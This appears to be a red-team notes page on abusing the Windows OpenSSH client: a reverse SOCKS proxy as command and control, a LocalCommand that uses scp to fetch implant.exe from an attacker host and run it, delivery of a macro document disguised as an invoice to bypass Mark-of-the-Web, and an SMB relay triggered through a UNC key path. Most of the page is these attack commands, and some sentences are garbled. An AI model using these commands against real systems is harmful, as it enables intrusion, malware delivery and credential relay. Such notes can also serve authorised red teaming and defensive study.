# Remote Clients

[[04 - Remote Port Forwarding]]

### SOCKS Proxy

Instead of dropping malware instead we'll use `proxychains` with the SSH server (the attacker's server) as a command and control which is legitimate, safer, and more familiar performing things remotely. This is considered as a non-malware implant.

```
C:\Windows\System32\OpenSSH\ssh.exe [-p <PORT>] -NTfCqR <SOCKS_proxy> -o "StrictHostKeyChecking=no"
```

In the SSH server we should see a listening port of the SOCKS Proxy.

```
$ ss -antpl
```

However, there is a limitation since it contains no limitation. To resolve this issue you must perform local enumeration to gather information of the compromised target that was established via SSH.

### Download File and Execute

Transfer file to the system.

```
C:\Windows\System32\OpenSSH\ssh.exe [-p <PORT>] -o "StrictHostKeyChecking=no PermitLocalCommand=yes" -o "LocalCommand=scp [-P <PORT>] <username>@<attacker_IP>:implant.exe %AppData%\Microsoft\Templates\implant.exe\. && %AppData%\Microsoft\Templates\implant.exe" <username>@<attacker_IP>
```

TODO: This can be used to transfer embedded macro document to bypass MOTW.

```
C:\Windows\System32\OpenSSH\ssh.exe [-p <PORT>] -o "StrictHostKeyChecking=no PermitLocalCommand=yes" -o "LocalCommand=scp [-P <PORT>] <username>@<attacker_IP>:macro_document.doc %AppData%\Microsoft\Templates\invoice.doc\. && %AppData%\Microsoft\Templates\invoice.doc" <username>@<attacker_IP>
```

### SMB Relay

For SSH server it doesn't to be from an attacker side. It can a real one as long the UNC path is set in order to execute command to perform SMB relay attack.

```
C:\> ssh -i \\<attacker_IP>\key.pem root@<IP>
```

---
## References

- [[SCP|File Transfer: SCP]]

- [LOLBAS: SSH](https://lolbas-project.github.io/lolbas/Binaries/Ssh/)

### RedSiege

- [RedSiege: SSHishing – Abusing Shortcut Files and the Windows SSH Client for Initial Access](https://redsiege.com/blog/2024/04/sshishing-abusing-shortcut-files-and-the-windows-ssh-client-for-initial-access/)